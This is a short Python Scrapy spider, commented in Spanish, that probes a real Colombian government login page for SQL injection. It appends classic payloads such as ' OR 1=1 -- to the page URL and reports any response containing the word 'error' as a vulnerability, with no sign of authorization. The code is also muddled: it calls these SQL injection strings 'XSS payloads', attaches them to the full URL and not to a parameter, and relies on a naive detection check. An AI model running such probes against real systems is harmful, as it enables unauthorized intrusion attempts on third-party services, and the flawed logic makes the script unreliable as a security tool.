import scrapy

class XSSSpider(scrapy.Spider):
    name = 'xsspider'

    def start_requests(self):
        # Define aquí la URL a escrapear:
        url = 'https://autenticaciondigital.and.gov.co/Login?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fscope%3Dopenid%2520co_scope%26state%3DTXtUNKmWOn-JwV2oprBZxC4ycxh7-7l42NKFAMtEUPg.OZL6lZMLl8Y.sitios_govco%26response_type%3Dcode%26client_id%3DgovcoterritorialsitiosPRO%26redirect_uri%3Dhttps%253A%252F%252Fauth.micolombiadigital.gov.co%252Faccounts%252Fauth%252Frealms%252Fcaf-master%252Fbroker%252Foidc%252Fendpoint%26nonce%3DSqfl6KWFb6fvyY0T8I9zFg'  # <-- reemplaza esto con la URL que quieras analizar
        yield scrapy.Request(url=url, callback=self.parse)

    def parse(self, response):
        xss_payloads = ['\' OR 1=1 --', '\' OR \'a\'=\'a']
        for payload in xss_payloads:
            vuln_url = response.url + payload
            yield scrapy.Request(url=vuln_url, callback=self.parse_result)

    def parse_result(self, response):
        # Aquí puedes procesar y analizar la respuesta…
        if 'error' in response.text.lower():
            yield {
                'vulnerability': 'SQL Injection',
                'url': response.url,
                'response': response.text
            }